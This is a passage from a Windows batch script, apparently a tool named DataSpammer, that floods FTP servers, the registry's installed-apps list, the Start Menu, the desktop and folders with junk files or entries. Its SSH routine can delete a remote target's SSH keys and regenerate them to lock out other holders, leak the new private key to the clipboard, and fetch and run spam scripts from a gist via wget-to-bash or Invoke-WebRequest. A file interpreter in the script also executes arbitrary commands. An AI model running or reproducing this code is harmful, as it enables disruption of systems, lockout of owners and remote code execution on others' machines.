    for /l %%i in (1,1,%filecount%) do (
        set localFile=%filename%!x!.txt
        echo put !localFile! >> %ftpCommands%
        set /a x+=1
    )
    
    :: Finish Command File & Execute on Host
    echo bye >> %ftpCommands%
    %cls.debug% && echo Establishing FTP Connection to %ftpserver%...
    ftp -n -s:%ftpCommands%
    
    :: Remove Files on local Machine
    del %ftpCommands%   
    set /a y=1
    cd /d "%temp%"
    for /l %%i in (1,1,%filecount%) do (
        erase %filename%%x%.txt
        set /a y+=1
    )
    
    if %logging% == 1 ( call :log Finished_FTP_Spam:_%filecount% INFO )
    call :done "The Script Created %filecount% Files on the FTP Server: %ftpserver%"



:app.list.spam
    %cls.debug%
    echo This Function will spam the Applist under "Settings > Apps > Installed Apps" with Entrys of your choice.
    echo:
    echo [1] Continue
    echo:
    echo [2] Go Back
    echo:
    echo:
    choice /C 12 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto app.list.spam.confirmed
        if %_erl%==2 goto start.verified
    goto app.list.spam

:app.list.spam.confirmed
    set /a x=0
    echo Enter random to use random Numerals
    echo Enter default to skip an Option
    set /P app.spam.name=Enter the App Name:
    echo:
    set /P app.spam.app.version=Enter the App Version:
    echo:
    set /P app.spam.path=Enter the Path of the App (any File):
    echo:
    set /P app.spam.publisher=Enter the Publisher:
    echo:
    set /P app.spam.filecount=How many Entrys should be created:
    
    for /f %%R in ('call :generate_random all 15') do set "random1=%%R"
    for /f %%R in ('call :generate_random all 15') do set "random2=%%R"
    for /f %%R in ('call :generate_random all 15') do set "random3=%%R"

    if %app.spam.name% == random set "app.spam.name=%random1%"
    if %app.spam.app.version% == random set "app.spam.app.version=%random2%"
    if %app.spam.path% == random set "app.spam.path=%~f0"
    if %app.spam.publisher% == random set "app.spam.publisher=%random3%"
    if %app.spam.name% == default set "app.spam.name=DataSpammer"
    if %app.spam.app.version% == default set "app.spam.app.version=%current_script_version%"
    if %app.spam.path% == default set "app.spam.path=%~f0"
    if %app.spam.publisher% == default set "app.spam.publisher=DataSpammer"
    set "RegPath=HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\%app.spam.name%"
    if defined ProgramFiles(x86) (
        set "RegPath=HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\%app.spam.name%"
    )
    

:app.spam.start.top
    for /L %%i in (1,1,%app.spam.filecount%) do (
        echo Creating Entry %x%
        reg add "%RegPath%%x%" /v "DisplayName" /d "%app.spam.name%%x%" /f
        reg add "%RegPath%%x%" /v "DisplayVersion" /d "%app.spam.app.version%" /f
        reg add "%RegPath%%x%" /v "InstallLocation" /d "%app.spam.path%" /f
        reg add "%RegPath%%x%" /v "Publisher" /d "%app.spam.publisher%" /f
        reg add "%RegPath%%x%" /v "UninstallString" /d "%~dp0\dataspammer.bat remove" /f
        set /a x+=1
    )
    echo Created %x% Entry(s).
    if %logging% == 1 ( call :log Finished_Spamming_Files:_%filecount% INFO )
    call :done "The Script Created %x% Entrys."





:startmenu.spam
    set /P filecount=How many Files should be created?:
    echo Only for Local User or For All Users?
    echo All Users requires Admin Privileges.
    choice /C AL /M "(A)ll / (L)ocal"
    set _erl=%errorlevel%
        if %_erl%==1 set "directory.startmenu=%ProgramData%\Microsoft\Windows\Start Menu\Programs" && goto startmenu.name
        if %_erl%==2 set "directory.startmenu=%AppData%\Microsoft\Windows\Start Menu\Programs" && goto startmenu.name
    goto startmenu.spam

:startmenu.name
    call :filename.check default-filename "Enter the Filename:"
    set /a x=0

    :: Create .lnk File
    %powershell_short% -Command ^
     $WshShell = New-Object -ComObject WScript.Shell; ^
     $Shortcut = $WshShell.CreateShortcut('%temp%\temp.lnk'); ^
     $Shortcut.TargetPath = '%~0'; ^
     $Shortcut.Save()

    for /L %%i in (1,1,%filecount%) do (
        echo Creating File %default-filename%%x%.txt
        copy "%temp%\temp.lnk" "%directory.startmenu%\%default-filename%%x%.txt"
        set /a x+=1
    )

    if %logging% == 1 ( call :log Finished_Spamming_Files:_%filecount% INFO )
    call :done "The Script Created %filecount% Files."

:ssh.spam
    if "%logging%"=="1" ( call :log Opened_SSH_Spam INFO )
    if "%logging%"=="1" ( call :log Listing_Local_IPs INFO )
    
    echo Enter the IP or the Hostename of the Device
    call :sys.lt 2
    echo:
    echo:
    :: Use nmap to find local IPs
    for /f "delims=" %%a in ('where nmap') do (
        set "where_output=%%a"
    )
    if defined where_output ( echo Scanning Local Subnet for IPs (takes ca. 10secs) && where_output nmap -sn 192.168.1.0/24 ) else ( echo Listing ARP Cache IPs && arp -a )
    
    echo:
    echo:
    echo:
    set /P ssh-ip=Enter the IP:
    set /P ssh-name=Enter the Username:
    set /P ssh-filecount=Enter the Filecount:
    set /P ssh-key=Enter the SSH-Key:
    call :sys.verify.execution
    %cls.debug%

:ssh.hijack
    echo Should the SSH-Keys be regenerated?
    echo This will prohibit anyone with the Old Keys from Accessing the Target
    echo:
    echo [1] Yes
    echo:
    echo [2] No
    echo:
    echo:
    choice /C 12 /M "Choose an option from above:"
        set _erl=%errorlevel%
        if %_erl%==1 set "ssh.regen=1" && goto ssh.start.spam
        if %_erl%==2 set "ssh.regen=0" && goto ssh.start.spam
    goto ssh.hijack

:ssh.start.spam
    echo Is the SSH Host running Windows or Linux?
    echo:
    echo [1] Windows
    echo:
    echo [2] Linux
    echo:
    echo:
    choice /C 12 /M "Choose an option from above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto spam.ssh.target.win
        if %_erl%==2 goto spam.ssh.target.lx
    goto ssh.start.spam


:spam.ssh.target.win
    setlocal EnableDelayedExpansion
    if "%logging%"=="1" ( call :log Spamming_Windows_SSH_Target INFO )

    if "%ssh.regen%"=="1" (
        echo Regenerating SSH keys on target...
        :: Generate New Keys
        if defined ssh-key (
            ssh -i "%ssh-key%" %ssh-name%@%ssh-ip% "del /Q C:\Users\%ssh-name%\.ssh\* && ssh-keygen -t rsa -b 4096 -f C:\Users\%ssh-name%\.ssh\id_rsa -N \"\" && type C:\Users\%ssh-name%\.ssh\id_rsa" > new_ssh_key.txt
        ) else (
            ssh %ssh-name%@%ssh-ip% "del /Q C:\Users\%ssh-name%\.ssh\* && ssh-keygen -t rsa -b 4096 -f C:\Users\%ssh-name%\.ssh\id_rsa -N \"\" && type C:\Users\%ssh-name%\.ssh\id_rsa" > new_ssh_key.txt
        )
        if errorlevel 1 (
            echo [ERROR] SSH key regeneration failed!
            goto ssh.done
        )
        echo New SSH private key generated and saved to new_ssh_key.txt:
        COPY new_ssh_key.txt CON
        type new_ssh_key.txt | clip
        :: Update the ssh-key variable to use the new key for the following connection
        set "ssh-key=new_ssh_key.txt"
    )

    set "ssh_command=%powershell_short% -Command \"& { Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/PIRANY1/4ee726c3d20d9f028b7e15a057c85163/raw/825fbd4af7339fab4f7bd62dd75f2cf9a239412b/spam.bat' -OutFile 'spam.bat'; Start-Process 'cmd.exe' -ArgumentList '/c spam.bat %ssh_filecount%' }\""

    echo Connecting to Windows SSH target...
    if defined ssh-key (
        ssh -i "%ssh-key%" %ssh-name%@%ssh-ip% "!ssh_command!"
    ) else (
        ssh %ssh-name%@%ssh-ip% "!ssh_command!"
    )
    color %color%
    if errorlevel 1 (
        echo [ERROR] SSH connection failed!
        goto ssh.done
    )

    echo Successfully executed SSH connection.
    goto ssh.done


:spam.ssh.target.lx
    setlocal EnableDelayedExpansion
    if "%logging%"=="1" ( call :log Spamming_Linux_SSH_Target INFO )

    if "%ssh.regen%"=="1" (
        echo Regenerating SSH keys on target...
        :: Generate New Keys
        if defined ssh-key (
            ssh -i "%ssh-key%" %ssh-name%@%ssh-ip% "rm -f ~/.ssh/id_rsa ~/.ssh/id_rsa.pub && ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N \"\" && cat ~/.ssh/id_rsa" > new_ssh_key.txt
        ) else (
            ssh %ssh-name%@%ssh-ip% "rm -f ~/.ssh/id_rsa ~/.ssh/id_rsa.pub && ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N \"\" && cat ~/.ssh/id_rsa" > new_ssh_key.txt
        )
        if errorlevel 1 (
            echo [ERROR] SSH key regeneration failed!
            goto ssh.done
        )
        echo New SSH private key generated and saved to new_ssh_key.txt:
        type new_ssh_key.txt
        type new_ssh_key.txt | clip
        :: Update the ssh-key variable to use the new key for subsequent connections
        set "ssh-key=new_ssh_key.txt"
    )

    set "ssh_command=bash <(wget -qO- https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.sh) %ssh-filecount%"
    
    echo Connecting to SSH target...
    if defined ssh-key (
        ssh -i "%ssh-key%" %ssh-name%@%ssh-ip% "!ssh_command!"
    ) else (
        ssh %ssh-name%@%ssh-ip% "!ssh_command!"
    )
    color %color%
    if errorlevel 1 (
        echo [ERROR] SSH connection failed!
        goto ssh.done
    )

    echo Successfully executed SSH connection.
    goto ssh.done

:ssh.done
    if %logging% == 1 ( call :log Finished_SSH_Spam_Files:_%ssh-filecount%_Host_%ssh-name% INFO )
    call :done "Created %ssh-filecount% Files on %ssh-name%@%ssh-ip%"





:desktop.icon.spam
    if %logging% == 1 ( call :log Opened_Desktop_Spam INFO )
    
    call :filename.check desk.spam.name "Enter the Filename:"
    set /p desk.spam.format=Choose the Format (without the dot):
    set /p desk.spam.content=Enter the File-Content:
    set /P filecount=How many Files should be created?:

    %cls.debug%
    echo Starting.....
    call :sys.lt 2
    set /a x=0

    for /L %%i in (1,1,%desk.filecount%) do (
        echo Creating File %desk.spam.name%%x%.%desk.spam.format%
        >> "%userprofile%\Desktop\%desk.spam.name%%x%.%desk.spam.format%" echo %desk.spam.content%
        set /a x+=1
    )

    if %logging% == 1 ( call :log Finished_Spamming_Files:_%deskspamlimitedvar% INFO )
    call :done "The Script Created %deskspamlimitedvar% Files."




:normal.text.spam
    if %logging% == 1 ( call :log Opened_Normal_Spam INFO )
    call :directory.input text_spam_directory "Enter the Directory: "
    call :filename.check filename "Enter the Filename:"
    set /P filecount=How many Files should be created?: 
    set /P defaultspam.content=Enter the File Content:
    
:spam.normal.top
    set /a x=1

    for /L %%i in (1,1,%filecount%) do (
        echo Creating File %filename%%x%.txt
        >> "%text_spam_directory%\%filename%%x%.txt" echo %defaultspam.content%
        set /a x+=1
    )

    if %logging% == 1 ( call :log Finished_Spamming_Files:_%filecount% INFO )
    call :done "The Script Created %filecount% Files."





:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: ------------------------------------------------- Spams <_> Argument Stuff------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------

:v6.port
    :: Port to V6, add Registry Keys
    echo Porting to V6...
    echo Adding Registry Key...
    reg add "HKCU\Software\DataSpammer" /v Installed /t REG_DWORD /d 1 /f
    reg add "HKCU\Software\DataSpammer" /v Version /t REG_SZ /d "%current_script_version%" /f
    echo Done. 
    echo Consider reinstalling the Script to avoid any issues. 
    goto restart.script

:ifp.install
    :: If Script was installed by Install Forge add Registry Stuff here
    :: Add Script to Windows App List
    set "RegPath=HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DataSpammer"
    if defined ProgramFiles(x86) (
        set "RegPath=HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\DataSpammer"
    )
    reg add "%RegPath%" /v "DisplayName" /d "DataSpammer" /f
    reg add "%RegPath%" /v "DisplayVersion" /d "%current_script_version%" /f
    reg add "%RegPath%" /v "InstallLocation" /d "%directory9%" /f
    reg add "%RegPath%" /v "Publisher" /d "PIRANY1" /f
    reg add "%RegPath%" /v "UninstallString" /d "%directory9%\dataspammer.bat remove" /f

    :: Add Reg Key - Remember Installed Status
    reg add "HKCU\Software\DataSpammer" /v Installed /t REG_DWORD /d 1 /f
    reg add "HKCU\Software\DataSpammer" /v Version /t REG_SZ /d "%current_script_version%" /f

    :: Add Script to PATH
    if defined addpath1 ( setx PATH "%PATH%;%directory9%\DataSpammer.bat" /M >nul )

    :: Add Remember Encrypted State Token
    call :generateRandom
    reg add "HKCU\Software\DataSpammer" /v Token /t REG_SZ /d "%realrandom%" /f
    reg add "HKCU\Software\DataSpammer" /v logging /t REG_SZ /d "1" /f
    reg add "HKCU\Software\DataSpammer" /v color /t REG_SZ /d "0F" /f
    echo Successfully Installed.
    goto restart.script


:custom.instruction.read
    :: Read Linked CIF File & interpret it
    set "interpret.dts=%~1"
    if not exist "%interpret.dts%" (
        %errormsg%
        call :color _Red "Custom Instruction File does not exist." error
        echo Please check the path and try again.
        call :sys.lt 5 count
        goto cancel
    )
    echo Parsing CIF File: %interpret.dts%
    set "firstLineHandled=false"
    for /f "usebackq delims=" %%L in ("%interpret.dts%") do (
        set "line=%%L"
        set "trimmed=!line:~0,1!"
        :: Ignore empty lines and comments
        if not "!line!"=="" if "!trimmed!" NEQ "#" (
            if "!firstLineHandled!"=="false" (
                :: Treat first line as label
                echo Used Label: %%L
                set "label.cif=%%L"
                set "firstLineHandled=true"
            ) else (
                :: If line has a "=", treat it as a variable assignment
                echo !line! | findstr "=" >nul
                if !errorlevel! == 0 (
                    for /f "tokens=1* delims==" %%A in ("!line!") do (
                        echo Setting Variable: %%A=%%B
                        set "%%A=%%B"
                    )
                ) else (
                    if not "%%L"=="" (
                        echo Executing command: %%L
                        %%L
                    )
                )
            )
        )
    )
    echo Finished Interpreting CIF File: %interpret.dts%
    echo Exiting...
    pause
    goto cancel


:fast.git.update
    :: Fast Update
    cd /d "%temp%"
    echo Checking for Updates...
    set "api_url=https://api.github.com/repos/PIRANY1/DataSpammer/releases/latest"
    curl -s %api_url% > apianswer.txt
    call :sys.lt 2
    for /f "tokens=2 delims=:, " %%a in ('findstr /R /C:"\"tag_name\"" apianswer.txt') do (
        set "latest_version=%%a"
    )
    set "latest_version=%latest_version:"=%"

    if "%latest_version%" equ "v6" (
        set "uptodate=up"
    ) else (
        set "uptodate=%current_script_version%"
    )

    if "%uptodate%"=="up" (
        echo The Script is up-to-date [Version:%latest_version%]
    ) else (
        echo Your Script is outdated [Newest Version: %latest_version% Script Version:%current_script_version%]
    )
    exit /b %errorlevel%


:sys.delete.script  
    :: Delete Script Dialog
    echo: 
    call :sys.lt 1
    echo You are about to delete the whole script. Are you sure?
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo You are about to delete the whole script. Are you sure?
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [1] Yes, Delete the Whole Script
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] Open the Github-Repo
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [3] No Go Back
    call :sys.lt 1
    echo:
    echo:
    choice /C 123S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto sys.delete.script.check.elevation
        if %_erl%==2 explorer "https://github.com/PIRANY1/DataSpammer" && goto sys.delete.script
        if %_erl%==3 goto cancel
        if %_erl%==4 call :standby
    goto sys.delete.script

:sys.delete.script.check.elevation
    :: Check if Script is elevated
    net session >nul 2>&1
    if %errorLevel% == 0 ( 
        goto sys.delete.script.confirmed 
    ) else ( 
        echo The Script is not running as Administrator. Please start the Script as Administrator in order to delete it.
        call :sys.lt 4
        explorer "%~dp0"
        goto cancel
    )
   
:sys.delete.script.confirmed
    :: Delete Script
    if exist "%~dp0\LICENSE" del "%~dp0\LICENSE"
    if exist "%~dp0\README.md" del "%~dp0\README.md"
    if exist "%USERPROFILE%\Desktop\DataSpammer.lnk" "erase %USERPROFILE%\Desktop\DataSpammer.lnk"
    set "RegPath=HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DataSpammer"
    if defined ProgramFiles(x86) (
        set "RegPath=HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\DataSpammer"
    )
    reg delete "%RegPath%" /f >nul 2>&1
    if exist "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Dataspammer.bat" erase "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Dataspammer.bat"
    if exist "%userprofile%\Documents\DataSpammerLog\" del /S /Q "%userprofile%\Documents\DataSpammerLog"
    reg query "HKCU\Software\DataSpammer" /v Installed >nul 2>&1
    if not %errorlevel% neq 0 ( reg delete "HKCU\Software\DataSpammer" /f )
    ASSOC .dts=
    FTYPE dtsfile=
    if exist "%~dp0\dataspammer.bat" del "%~dp0\dataspammer.bat"
    echo Uninstall Successfulled
    
:restart.script
    :: Restart Script
    :: Clear CHCP to prevent display issues
    set "chcp="
    if "%logging%"=="1" ( call :log Restarting_Script WARN )
    erase "%~dp0\dataspammer.lock" >nul 2>&1
    call :send_message Script is restarting
    call :send_message Terminating %PID%
    echo: > %temp%\DataSpammerClose.txt
    start %elevPath% cmd.exe /c "%~f0" %b.flag%%v.flag%
    goto cancel


:monitor
    :: When Monitor is invoked, it observes the script and provides details about its current state.
    :: Monitor is still Experimental & may cause problems
    @echo off
    setlocal EnableDelayedExpansion
    %cls.debug%
    del "%temp%\DataSpammerCrashed.txt" > nul
    del "%temp%\DataSpammerClose.txt" > nul
    title Monitoring DataSpammer PID: %~2
    echo Opened Monitor Socket.
    echo Waiting for Startup to Finish...
    if exist "%temp%\socket.con " (
        del "%temp%\socket.con" >nul
        echo Socket Connection Established.
    )
    title Monitoring DataSpammer.bat
    :: Parse PID from Main Process
    set "PID.DTS=%~2"
    echo PID: %PID.DTS%
    set "batScript=%temp%\dts-monitor.bat"
    erase "%batScript%" >nul


    :: Observe Process, loop and if its not running, write to a file
    (
        echo @echo off
        echo setlocal
        echo Monitoring DataSpammer.bat with PID %PID.DTS%
        echo :check_process
        echo tasklist /FI "PID eq %PID.DTS%" ^| findstr /R /C:" %PIDToCheck% " ^>nul
        echo if errorlevel 1 ^(
        echo    echo DataSpammmer with PID %PID.DTS% crashed at %%date%% %%time%% ^> "%%temp%%\DataSpammerCrashed.txt"
        echo    echo DataSpammmer with PID %PID.DTS% crashed at %%date%% %%time%%
        echo    exit /b %errorlevel%
        echo ^)
        echo timeout /t 1 ^>nul
        echo goto check_process
    ) > "%batScript%"

    start /b "" "%batScript%"

    
    :: Start a PowerShell process to monitor the DataSpammer.bat process
    :: Needs to be tested
    :: start "" %powershell_short% -ExecutionPolicy Bypass -Command "& {param([int]$pid) while ($true) {try {Get-Process -Id $pid -ErrorAction Stop} catch {"DataSpammer-Process Crashed at $(Get-Date)" | Out-File -FilePath $env:temp\DataSpammerCrashed.txt; break} Start-Sleep -Seconds 0.5}} -pid %PID%"


    :fullloop
    :: For controlled exits use echo: > %temp%\DataSpammerClose.txt

        for /f "tokens=1-3 delims=:." %%a in ("%time%") do set formatted_time=%%a:%%b:%%c

        :: Check if a Message is available
        if exist "%TEMP%\socket.message" (
            set /p message.monitor=<"%TEMP%\socket.message"
            del "%TEMP%\socket.message" >nul
            echo %formatted_time%: %message.monitor%
        )

        if exist "%temp%\DataSpammerCrashed.txt" (
            del "%temp%\DataSpammerCrashed.txt" >nul
            echo DataSpammer.bat Crashed at !formatted_time!
            timeout /t 5 >nul
            exit /b %errorlevel%
        )
        if exist "%temp%\DataSpammerClose.txt" (
            del "%temp%\DataSpammerClose.txt" >nul
            echo DataSpammer.bat was Closed at !formatted_time!
            timeout /t 5 >nul
            exit /b %errorlevel%
        )

    call :sys.lt 1
    goto fullloop

:dev.options
    :: Dev Options
    title Developer Options - DataSpammer
    echo PID: %PID%
    echo Developer Options
    echo:
    echo [1] Custom Goto
    echo:
    echo [2] @ECHO ON
    echo:
    echo [3] Set a Variable 
    echo:
    echo [4] Restart the Script (Variables will be kept)
    echo:
    echo [5] Restart the Script (Variables wont be kept)
    echo:
    echo [6] List all :signs
    echo:
    echo [7] List all :signs
    echo:
    echo [8] Go Back
    choice /C 12345678S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto dev.options.call.sign
        if %_erl%==2 @echo on && %cls.debug% && goto dev.options
        if %_erl%==3 set /P var=Enter the Variable Name: && set /P value=Enter the Value: && set %var%=%value% && %cls.debug% && goto dev.options
        if %_erl%==4 goto top
        if %_erl%==5 goto restart.script
        if %_erl%==6 call :list.vars && pause && %cls.debug%
        if %_erl%==7 goto settings
        if %_erl%==8 goto debug.info     
        if %_erl%==9 call :standby
    goto dev.options

:debug.info
    echo Monitoring: %monitoring%
    echo Script Version: %current_script_version%
    echo Logging: %logging%
    echo Developer Mode: %developermode%
    echo Color: %color%
    echo Default Filename: %default_filename%
    echo Update: %update%
    echo Elevation: %elevation%
    echo Skip Security Check: %skip-sec%
    goto dev.options

:dev.options.call.sign
    :: List all Call Signs
    echo List all Call Signs?
    choice /C YN /M "(Y)es / (N)o"
        set _erl=%errorlevel%
        if %_erl%==1 call :list.vars && %cls.debug% && set /P jumpto=Enter the Call Sign: && goto %jumpto% 
        if %_erl%==2 %cls.debug% && set /P jumpto=Enter the Call Sign: && goto %jumpto%
    goto dev.options.call.sign

:sys.new.update.installed
    :: Renew Version Registry Key
    set "RegPath=HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DataSpammer"
    if defined ProgramFiles(x86) (
        set "RegPath=HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\DataSpammer"
    )
    reg delete "%RegPath%" /v "DisplayVersion" /f
    reg add "%RegPath%" /v "DisplayVersion" /d "%current_script_version%" /f
    %cls.debug% && echo Updated Settings.
    %cls.debug% && echo Successfully updated the Registry Key for the Version.
    if %logging% == 1 ( call :log Updated_Script_Version:%current_script_version% INFO )
    if %logging% == 1 ( call :log Errorlevel_after_Update:_%errorlevel% INFO )
    echo Successfully Updated to %current_script_version%
    echo Restarting...
    call :sys.lt 4 count
    goto restart.script

:debugtest
    :: Start Debug Test
    echo Running Debug Test...
    set "starttime=%time%"
    echo %time%
    call :sys.lt 10 count
    echo %time%
    set "endtime=%time%"
    

    :: Calc time Diff in ms
    call :TimeDiffInMs "%starttime%" "%endtime%"
    echo Time difference: %timeDiffMs%ms

    :: Check Win Version
    call :win.version.check
    echo %OSEdition%
    echo Type: %OSType%
    echo Version: %OSVersion%
    echo Build: %OSBuild%
    call :generate_random all 40
    
    call :version

    %errormsg%
    echo Errorlevel: %errorlevel%
    echo Finished Testing...
    echo Exiting
    goto cancel


:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: ------------------------------------------------- Functions --------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------

:: ------------------------------
:: :filename.check
:: Prompts the user to enter a filename.
:: Verifies that the filename is valid using :fd.check.
::
:: Arguments:
::   %1 - Variable name (key) to store the user's input
::   %2 - Prompt message to display to the user
::
:: Example:
::   call :filename.check myfile "Enter the target filename: "
::   echo You entered: !myfile!
::
:: Returns:
::   errorlevel 0 if the directory exists and is writable
::   errorlevel 1 if not (loop will re-prompt)
:: ------------------------------
:filename.check
    call :check_args :filename.check "%~1" "%~2"
    set "key=%~1"
    set "prompt=%~2"

    if defined default-filename (
        set "!key!=!default-filename!"
        exit /b 0
    )

    :filename.check.sub
    set /p "!key!=!prompt!"

    if not defined !key! (
        echo No filename specified. Please provide a filename.
        goto filename.check.sub
    )

    for /f "delims=" %%A in ('echo !%key%!') do set "f.path=%%A"

    call :fd.check file "!f.path!"
    if "!errorlevel!"=="1" (
        goto filename.check.sub
    )

    echo The file "!f.path!" exists and is writable.
    exit /b 0

:fd.check
    :: Check if a File or a Directory has a valid syntax
    :: Example:
    :: call :fd.check file thisisinvalid//.txt
    :: call :fd.check directory "C:\this\is\invalid\:?.txt"
    call :check_args :fd.check "%~1" "%~2"
    set "type=%~1"
    set "filepath=%~2"
    if "%type%"=="file" (
        echo.%filename% | findstr /R "[\\/:*?\"<>|]" >nul
        if %errorlevel%==0 (
            echo Invalid characters in filename: %filepath%
            exit /b 1
        )
    ) else if "%type%"=="directory" (
        for %%F in ("%filepath%") do (
            echo.%%~nF | findstr /R "[\\/:*?\"<>|]" >nul
            if not errorlevel 1 (
                echo Invalid characters found in filename: %%~nF
                exit /b 1
            )
        )        
    )
    exit /b 0

:: ------------------------------
:: :directory.input
:: Prompts the user to enter a directory path.
:: Verifies that the directory exists and is writable using :rw.check.
::
:: Arguments:
::   %1 - Variable name (key) to store the user's input
::   %2 - Prompt message to display to the user
::
:: Example:
::   call :directory.input mydir "Enter the target directory: "
::   echo You entered: !mydir!
::
:: Returns:
::   errorlevel 0 if the directory exists and is writable
::   errorlevel 1 if not (loop will re-prompt)
:: ------------------------------


:directory.input
    call :check_args :rw.check "%~1" "%~2"
    set "key=%~1"
    set "prompt=%~2"
    
    :directory.input.sub
    set /p "!key!"=!prompt!
    
    if not defined !key! (
        echo No directory specified. Please provide a directory.
        goto directory.input.sub
    )
    
    set "dir.path=!%key%!"
    call :fd.check directory "%dir.path%"
    call :rw.check "%dir.path%"
    if "%errorlevel%"=="1" (
        goto directory.input.sub
    )
    
    echo The directory "!dir.path!" exists and is writable.
    exit /b 0


:: ------------------------------
:: :rw.check
:: Checks whether the given directory exists and is writable.
:: It creates and renames a temporary file to test permissions.
::
:: Arguments:
::   %1 - Full path to the directory to test
::
:: Example:
::   call :rw.check "%temp%"
::
:: Returns:
::   errorlevel 0 if the directory exists and is writable
::   errorlevel 1 if it does not exist or is not writable
:: ------------------------------
:rw.check
    set "rw.path=%~1"
    set "testfilename=tmpcheck_%random%"
    set "testfile=%rw.path%\%testfilename%.tmp"
    echo. > "%testfile%" 2>nul || (
        call :color _Red "Could not create a temporary file in the directory "%rw.path%"." error
        exit /b 1
    )
    if not exist "%rw.path%\" (
        call :color _Red "The directory "%rw.path%" does not exist." error
        exit /b 1
    )

    ren "%testfile%" "%testfilename%.locked" 2>nul || (
        call :color _Red "The directory "%rw.path%" is not writable." error
        del "%testfile%" 2>nul
        exit /b 1
    )

    del "%rw.path%\%testfilename%.locked" 2>nul
    call :color _Green "The directory "%rw.path%" exists and is writable." okay
    exit /b 0



:dataspammer.hash.check
    if "%unsecure%"=="1" (
        call :color _Red "Unsecure Mode Detected, Skipping Hash Check" warning
        exit /b 0
    )
    if "%current_script_version%"=="development" (
        call :color _Yellow "Development Version Detected, Skipping Hash Check" warning
        exit /b 0
    )
    :: Compare local and remote script hash

    set "remote=https://github.com/PIRANY1/DataSpammer/releases/download/%current_script_version%/dataspammer.bat"
    
    curl -s -o "%TEMP%\dataspammer_remote.bat" "%remote%"
    fc /b "%~f0" "%TEMP%\dataspammer_remote.bat" >nul 2>&1
    if errorlevel 1 (
        %errormsg%
        call :color _Red "The GitHub version of the script differs from your local version." error
        call :color _Yellow "This could be due to a failed update or manual modifications." warning
        call :color _Green "Run the script with the /unsecure flag to skip this check." okay
        del "%TEMP%\dataspammer_remote.bat" >nul 2>&1
        goto cancel
    ) else (
        call :color _Green "The local script matches the remote version." okay
        del "%TEMP%\dataspammer_remote.bat" >nul 2>&1
        exit /b 0
    )

:: Generate real random numbers ( default %random% is limited to 32767)
:generateRandom
    :: Get Random Numbers
    set "r1=%random%"
    set "r2=%random%"
    set "str=%r1%_%r2%"

    :: Generate Hash
    for /f %%h in ('echo %str% ^| %powershell_short% -command "$s = $input; $h = [BitConverter]::ToString((New-Object System.Security.Cryptography.SHA256Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($s))).Replace('-', ''); Write-Output $h"') do (
        set "hash=%%h"
    )

    :: Extract only digits from the hash
    set "digits="
    for /l %%i in (0,1,63) do (
        set "char=!hash:~%%i,1!"
        if "!char!" geq "0" if "!char!" leq "9" set "digits=!digits!!char!"
    )

    if not defined digits set "digits=12345"

    :: Max 5 Digits
    set "realrandom=!digits:~0,5!"
    exit /b
    

:: =====================================
:: call :color "ERROR"
:: Supported Colors: Red, Green, Blue, Gray, White, _Red, _White, _Green, _Yellow
:: call :color Red      "This is red on light white"
:: call :color _Red     "This is red on black"
:: call :color Green    "Green on white"
:: call :color _Green   "Green on black"
:: call :color Blue     "Blue on white"
:: call :color Gray     "Gray background"
:: call :color White    "Bright white"
:: call :color _White   "White on dark gray"
:: call :color _Yellow  "Yellow on black"
:: =====================================

:color
    :: Parameter: color text [emoji-keyword]
    setlocal EnableDelayedExpansion
    set "color.func=%~1"
    set "emoji.key=%~3"

    shift
    set "text=%~1" 
    set "text=!text:"=!" 

    for %%F in (Red Gray Green Blue White _Red _White _Green _Yellow) do (
        set "text=!text:%%F=!"
    )

    if "%chcp%"=="65001" (
        if "!emoji.key!"=="" (
            set "emoji="
        ) else (
            if /I "!emoji.key!"=="okay" set "emoji=✅ "
            if /I "!emoji.key!"=="error" set "emoji=❌ "
            if /I "!emoji.key!"=="warning" set "emoji=⚠️ "
            if /I "!emoji.key!"=="info" set "emoji=ℹ️ "
        )
    ) else (
        set "emoji="
    )

    call :check_args :done "%~1" "%~2"
    if "%errorlevel%"=="1" (
        %errormsg%
        echo %text%
        exit /b 1
    )

    :: Remove underscore
    set "text=!text:_=!"

    :: Remove first space
    if "!text:~0,1!"==" " (
        set "text=!text:~1!"
    )

